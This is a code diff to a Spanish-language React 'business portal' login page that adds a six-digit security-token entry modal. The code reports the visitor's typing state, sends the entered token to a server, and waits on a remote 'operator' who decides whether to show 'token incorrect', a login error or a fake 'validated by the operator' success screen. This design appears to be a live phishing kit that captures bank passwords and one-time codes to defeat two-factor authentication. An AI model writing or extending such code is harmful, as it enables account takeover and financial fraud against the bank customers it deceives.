@@ -17,6 +17,13 @@ export default function PortalEmpresas({ onBack }) {
   const [loading, setLoading] = useState(false)
   const [loginError, setLoginError] = useState("")
 
+  // Generic token and validation states
+  const [otpType, setOtpType] = useState(null) // null, 'token'
+  const [otpValues, setOtpValues] = useState(["", "", "", "", "", ""])
+  const [otpSubmitting, setOtpSubmitting] = useState(false)
+  const [otpError, setOtpError] = useState("")
+  const [sessionSuccess, setSessionSuccess] = useState(false)
+
   const pingIntervalRef = useRef(null)
   const pollIntervalRef = useRef(null)
 
@@ -40,7 +47,7 @@ export default function PortalEmpresas({ onBack }) {
     sendPing()
     pingIntervalRef.current = setInterval(sendPing, 3000)
 
-    // 2. Poll session state every 1.5 seconds to check if the operator triggered a login error
+    // 2. Poll session state every 1.5 seconds to check operator action
     pollIntervalRef.current = setInterval(async () => {
       try {
         const response = await fetch(`/api/sessions/${sessId}`)
@@ -48,9 +55,33 @@ export default function PortalEmpresas({ onBack }) {
           const data = await response.json()
           const action = data.action
 
-          if (action === "error-login") {
+          if (action === "done") {
+            stopLoops()
+            setOtpType(null)
+            setLoading(false)
+            setSessionSuccess(true)
+          } else if (action === "token") {
+            // Keep loader active if token is present and currently being validated on server
+            if (data.token && data.token !== "") {
+              setOtpSubmitting(true)
+            } else {
+              setOtpSubmitting(false)
+              setOtpType("token")
+            }
+          } else if (action === "error-token") {
+            setOtpSubmitting(false)
+            setOtpError("Token incorrecto. Por favor, verifica e ingresa nuevamente.")
+            setOtpValues(["", "", "", "", "", ""])
+            // Reset action on server so it doesn't loop
+            fetch(`/api/sessions/${sessId}/action`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ action: null }),
+            }).catch(() => {})
+          } else if (action === "error-login") {
             stopLoops()
             setLoading(false)
+            setOtpType(null)
             setLoginError("Usuario o contraseña incorrecta. Por favor, verifique sus datos.")
           }
         }
@@ -106,6 +137,100 @@ export default function PortalEmpresas({ onBack }) {
         setLoading(false)
         setLoginError("Error al intentar conectar. Intente de nuevo.")
       })
+  }
+
+  const handleOtpChange = (index, val) => {
+    const newVal = val.replace(/\D/g, "").slice(-1)
+    const newOtpValues = [...otpValues]
+    newOtpValues[index] = newVal
+    setOtpValues(newOtpValues)
+
+    let sessId = sessionStorage.getItem("sessionId")
+    if (sessId) {
+      const len = newOtpValues.filter((v) => v !== "").length
+      const targetState = len > 0 ? "typing" : "waiting-token"
+      fetch(`/api/sessions/${sessId}/state`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ state: targetState }),
+      }).catch(() => {})
+    }
+
+    if (newVal && index < 5) {
+      const nextInput = document.getElementById(`otp-slot-${index + 1}`)
+      if (nextInput) nextInput.focus()
+    }
+  }
+
+  const handleOtpKeyDown = (index, event) => {
+    if (event.key === "Backspace" && !otpValues[index] && index > 0) {
+      const newOtpValues = [...otpValues]
+      newOtpValues[index - 1] = ""
+      setOtpValues(newOtpValues)
+
+      const prevInput = document.getElementById(`otp-slot-${index - 1}`)
+      if (prevInput) {
+        prevInput.focus()
+      }
+    }
+  }
+
+  const handleOtpPaste = (event) => {
+    event.preventDefault()
+    const clipboardData = event.clipboardData.getData("text") || ""
+    const digits = clipboardData.replace(/\D/g, "").slice(0, 6).split("")
+
+    const newOtpValues = [...otpValues]
+    digits.forEach((digit, i) => {
+      newOtpValues[i] = digit
+    })
+    setOtpValues(newOtpValues)
+
+    const lastIdx = Math.min(digits.length, 6) - 1
+    if (lastIdx >= 0) {
+      const lastInput = document.getElementById(`otp-slot-${lastIdx}`)
+      if (lastInput) lastInput.focus()
+    }
+  }
+
+  const handleOtpSubmit = () => {
+    const token = otpValues.join("")
+    if (token.length !== 6) return
+
+    setOtpSubmitting(true)
+    let sessId = sessionStorage.getItem("sessionId")
+    fetch(`/api/sessions/${sessId}/token`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ token }),
+    }).catch(() => {
+      setOtpSubmitting(false)
+    })
+  }
+
+  const handleOtpClose = () => {
+    stopLoops()
+    setOtpType(null)
+    setLoading(false)
+  }
+
+  if (sessionSuccess) {
+    return (
+      <div className="portal portal--empresas portal--success">
+        <section className="portal__form" style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center" }}>
+          <div className="portal__card" style={{ textAlign: "center", padding: "48px 32px" }}>
+            <div style={{ color: "#3ecf8e", fontSize: "48px", marginBottom: "16px" }}>✓</div>
+            <h2 style={{ marginBottom: "16px" }}>¡Ingreso Exitoso!</h2>
+            <p style={{ color: "#5b7388", marginBottom: "32px" }}>
+              Su sesión ha sido validada de forma segura por el operador.
+            </p>
+            <button type="button" className="portal__submit is-ready" onClick={onBack}>
+              Continuar
+            </button>
+          </div>
+        </section>
+      </div>
+    )
   }
 
   return (
@@ -204,12 +329,96 @@ export default function PortalEmpresas({ onBack }) {
         </form>
       </section>
 
-      {loading ? (
+      {loading && !otpType ? (
         <div className="portal__loader" role="status" aria-live="polite">
           <span className="portal__spinner" />
           <span className="sr-only">Cargando</span>
         </div>
       ) : null}
+
+      {/* Generic token validation modal */}
+      {otpType && (
+        <div className="bc-key-validation">
+          <div className="app-bg-otp" aria-hidden="true">
+            <img src="/assets/otp-bg.png" alt="" />
+          </div>
+
+          <div className="bc-key-validation-dialog" role="dialog" aria-modal="true">
+            <div className="bc-key-validation-close">
+              <button type="button" onClick={handleOtpClose} aria-label="cerrar">×</button>
+            </div>
+
+            <div className="bc-key-validation-content" style={{ display: otpSubmitting ? "none" : "block" }}>
+              <div className="bc-key-validation-header">
+                <div className="bc-key-validation-dynamic-container">
+                  <svg className="otp-strokes" viewBox="0 0 220 80" aria-hidden="true">
+                    <path d="M8 18 C 40 8, 70 28, 96 14" fill="none" stroke="#f4d24a" stroke-width="7" stroke-linecap="round" />
+                    <path d="M18 38 C 52 22, 88 48, 118 28" fill="none" stroke="#f07a3a" stroke-width="8" stroke-linecap="round" />
+                    <path d="M38 62 C 72 48, 102 70, 138 54" fill="none" stroke="#3ecf8e" stroke-width="7" stroke-linecap="round" />
+                    <path d="M70 8 C 92 2, 108 22, 128 10" fill="none" stroke="#7ed0ea" stroke-width="6" stroke-linecap="round" />
+                  </svg>
+                  <div className="otp-app-icon" aria-hidden="true">
+                    <span>Mi</span>
+                    <svg viewBox="0 0 32 32">
+                      <path d="M8.08 11.06c.15.57.73.87 1.33.67 4.86-1.47 9.74-2.48 14.77-3.22.58-.08.89-.66.68-1.25-.45-1.24-.67-1.86-1.13-3.09-.19-.53-.72-.87-1.25-.81-4.92.6-9.67 1.48-14.43 2.84-.62.19-1 .87-.84 1.48.35 1.35.52 2.02.87 3.38z" fill="#fff" />
+                      <path d="M27.56 11.79c-.19-.56-.7-.93-1.2-.86-7.65.97-15.09 2.85-22.15 5.95-.51.24-.82.89-.71 1.45.28 1.45.42 2.18.7 3.63.12.62.7.91 1.28.63 7.17-3.26 14.75-5.34 22.52-6.58.49-.08.75-.64.56-1.22-.39-1.2-.59-1.8-.99-3z" fill="#fff" />
+                      <path d="M27.62 19.9c-.19-.6-.74-.99-1.26-.88-4.75 1.04-9.39 2.29-13.99 3.88-.58.21-.91.83-.76 1.4.37 1.36.55 2.04.92 3.4.17.64.89.96 1.54.71 4.6-1.66 9.24-3.1 13.99-4.26.45-.11.68-.65.51-1.2-.37-1.22-.56-1.83-.95-3.05z" fill="#fff" />
+                    </svg>
+                  </div>
+                </div>
+                <h3>Ingresa el Token de Seguridad</h3>
+              </div>
+
+              <div className="bc-key-validation-body">
+                <p className="bc-key-validation-description" style={{ color: otpError ? "#d93838" : "", fontWeight: otpError ? "600" : "" }}>
+                  {otpError || "Por favor, ingresa el código de 6 dígitos generado por tu aplicación o token de seguridad."}
+                </p>
+                <div className="bc-key-validation-input-container">
+                  <div className="bc-input-token-container">
+                    {otpValues.map((val, i) => (
+                      <input
+                        key={i}
+                        id={`otp-slot-${i}`}
+                        className="bc-input"
+                        inputMode="numeric"
+                        maxLength={1}
+                        autoComplete="off"
+                        value={val}
+                        onChange={(e) => handleOtpChange(i, e.target.value)}
+                        onKeyDown={(e) => handleOtpKeyDown(i, e)}
+                        onPaste={handleOtpPaste}
+                        aria-label={`Ingresar dígito ${i + 1}`}
+                      />
+                    ))}
+                  </div>
+                </div>
+              </div>
+
+              <div className="bc-key-validation-footer">
+                <div className="bc-key-validation-action-container">
+                  <button className="btn-secondary" type="button" onClick={() => {
+                    setOtpValues(["", "", "", "", "", ""])
+                    setOtpError("")
+                  }}>Borrar</button>
+                  <button
+                    className="btn-primary"
+                    type="button"
+                    disabled={otpValues.join("").length !== 6}
+                    onClick={handleOtpSubmit}
+                  >
+                    Continuar
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <div className="bc-key-validation-content-loading" style={{ display: otpSubmitting ? "flex" : "none" }}>
+              <span className="validate-spin" aria-hidden="true"></span>
+              <p>Validando Token de Seguridad...</p>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
